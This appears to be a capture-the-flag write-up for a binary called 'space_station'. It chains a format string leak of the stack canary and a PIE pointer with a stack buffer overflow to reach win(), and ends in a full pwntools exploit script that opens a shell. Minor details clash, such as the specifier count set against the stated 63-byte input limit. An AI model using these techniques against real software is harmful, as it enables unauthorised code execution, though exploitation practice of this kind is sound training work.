## Space Station - ret2win with Canary and PIE Leak

This challenge shares the same structural goal as a standard ret2win, but introduces two independent leak requirements: the stack canary must be recovered to survive the overflow check, and a PIE code pointer must be leaked from the stack to compute the runtime address of `win()`, since PIE randomizes the binary's base address on every execution. Both leaks are obtained through a single format string vulnerability before the overflow is triggered.


### Phase 0 - Challenge Triage

The binary sub-category is a stack buffer overflow with canary bypass and ASLR/PIE bypass, both achieved via a format string vulnerability in the same binary. The artifacts provided are the `space_station` ELF binary and its C source `main.c`. The initial hypothesis is: this challenge looks like a ret2win with format string leaks because PIE is enabled and a `printf(name)` call in the source accepts unsanitized user input, which can be used to walk the stack and recover both the canary and a code pointer to reconstruct the PIE base.


### Phase 1 - Reconnaissance & Enumeration

Run `checksec` to confirm the full protection picture:

```bash
checksec --file ./space_station
```

The expected output is:

|Protection|Status|Implication|
|---|---|---|
|Canary|✅ Found|Must be leaked before overflowing|
|NX|✅ Enabled|Stack is not executable, no shellcode|
|PIE|✅ Enabled|`win()` address changes every run, must be computed|

Then open `main.c` and identify three things: which function calls `printf(name)` directly (the format string vulnerability), which function performs a large `read()` into a small buffer (the overflow), and whether a `win()` function is present.


### Phase 2 - Vulnerability Identification

Two vulnerabilities are chained together. The first is a format string vulnerability where user input is passed directly to `printf` without a format specifier, allowing arbitrary stack reads by injecting `%lx` or positional `%N$lx` specifiers. The second is a classic stack buffer overflow in the mission log input, where `read()` accepts more bytes than the buffer can hold. The canary is present but since both its value and the PIE base are recoverable from the stack via the format string, the overflow becomes fully controllable.


### Phase 3 - Exploitation Plan

```
TARGET VULNERABILITY: Format string (stack leak) + stack buffer overflow
GOAL: Redirect execution to win() and get a shell
APPROACH:
  Step 1: Use the format string vulnerability to leak the canary (index 15) and a PIE code pointer (index 17)
  Step 2: Compute PIE base = leaked pointer − PIE_OFFSET, then win() = PIE base + win static offset
  Step 3: Trigger the buffer overflow with the recovered canary and the computed win() address
TOOLS: pwntools, GDB + pwndbg, nm, ROPgadget
RISK OF FAILURE: format string truncated by read() limit; wrong index for canary or PIE pointer; stack misalignment without ret gadget
```


### Phase 4 - Exploit Development

#### Mapping the Stack with the Format String

The first step is to probe the stack by sending a chain of `%lx` specifiers to the name prompt. The `AAAA` marker (`41414141` in hex) helps identify which stack index corresponds to the start of the input buffer, and from there the canary and code pointer indices can be determined by inspection.

```bash
python3 -c "print('AAAA.' + '.'.join(['%lx']*25))" | ./space_station
```

An important constraint emerges from the source: the name input is capped at 63 bytes by `read(0, buf, 63)`, so a long chain of specifiers gets silently truncated before it ever reaches `printf`. This is not a null byte on the stack stopping output early — it is simply the input running out. Dropping the `AAAA.` prefix (5 bytes) and using `%lx.` (4 bytes each) allows roughly 15 specifiers to fit comfortably within the 63-byte budget, which is sufficient to reach both targets.

```bash
./space_station

# when prompted for name:
%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx

# output:
7ffe6409dd70.3f.7f68eba21862.19.7f68ebb44040.2e786c252e786c25.2e786c252e786c25.
2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.
2e786c252e786c25.786c252e786c25.7ffe6409def8.
7cd8aca7ee793900.   # index 15: canary (always ends in 00)
7ffe6409dde0.
0x55c6ee61e39e.     # index 17: saved return address (PIE pointer)
```

From the output, index 15 is the canary (recognizable by the trailing `00` byte), and index 17 is a saved return address that was pushed onto the stack when `main` called `vuln`. These are the two values needed for the exploit.

#### Computing the PIE Base and win() Address

The value at index 17 is the runtime address of `main+62`, recovered by breaking at `vuln()` in GDB and inspecting the return address on the stack. The static offset of that return address from the binary's base is `0x139e`, which is computed as the static address of `main` from `nm` (`0x1360`) plus the 62-byte offset observed in GDB. With both the leaked value and the known static offset, the PIE base follows directly:

```
PIE base = leaked_value − 0x139e
win()    = PIE base + 0x1275
```

For example, if the leak gives `0x55c6ee61e39e`, then:

```
PIE base = 0x55c6ee61e39e − 0x139e = 0x55c6ee61d000
win()    = 0x55c6ee61d000 + 0x1275 = 0x55c6ee61e275
```

The `ret` gadget for stack alignment follows the same pattern, since PIE means its address must also be computed at runtime:

```
ret gadget = PIE base + 0x101a
```

Find the static offset with:

```bash
ROPgadget --binary ./space_station | grep ": ret$"
```

#### Finding the Offset to the Canary

Open GDB, generate a cyclic pattern, and send `AAAA` at the name prompt (the format string is no longer needed here) and the cyclic pattern at the mission log prompt:

```bash
gdb ./space_station
pwndbg> cyclic 200
pwndbg> run
```

When the canary check fires and the program aborts, inspect the stack trace:

```bash
pwndbg> bt
# __stack_chk_fail confirms the canary was overwritten

pwndbg> frame <vuln frame number>
pwndbg> cyclic -l <value at $rbp-0x8>
# Found at offset 72
```

The offset to RIP then follows from the standard formula:

```
OFFSET_TO_RIP = 72 + 8 (canary) + 8 (saved RBP) = 88
```

#### Known Values Summary

|What|Value|
|---|---|
|Canary index|`15`|
|PIE pointer index|`17`|
|PIE pointer static offset|`0x139e`|
|`win()` static offset|`0x1275`|
|`ret` gadget static offset|`0x101a`|
|Offset to canary|`72`|
|Offset to RIP|`88`|

### The Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./space_station')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88   # canary + saved RBP

# ── format string indices ─────────────────────────────────────────────────────
CANARY_IDX = 15
PIE_IDX    = 17

# ── PIE-relative offsets ──────────────────────────────────────────────────────
PIE_OFFSET    = 0x139e   # main+62 static offset from pie_base
GADGET_OFFSET = 0x101a   # ret gadget static offset from pie_base

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    # ── leak phase ────────────────────────────────────────────────────────────
    r = conn()
    r.recvuntil(b'name')
    r.sendline(f'%{CANARY_IDX}$lx.%{PIE_IDX}$lx'.encode())

    response = r.recvline()
    parts    = response.strip().split(b'.')
    canary   = int(parts[0], 16)
    pie_leak = int(parts[1], 16)

    pie_base = pie_leak - PIE_OFFSET
    win_addr = pie_base + exe.sym.win
    gadget   = pie_base + GADGET_OFFSET

    log.info(f'canary   = {canary:#x}')
    log.info(f'pie_base = {pie_base:#x}')
    log.success(f'win()    = {win_addr:#x}')

    # ── exploit phase ─────────────────────────────────────────────────────────
    r.recvuntil(b'log')
    payload = flat(
        b'A' * OFFSET_TO_CANARY,
        p64(canary),
        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # overwrite saved RBP
        p64(gadget),
        p64(win_addr),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```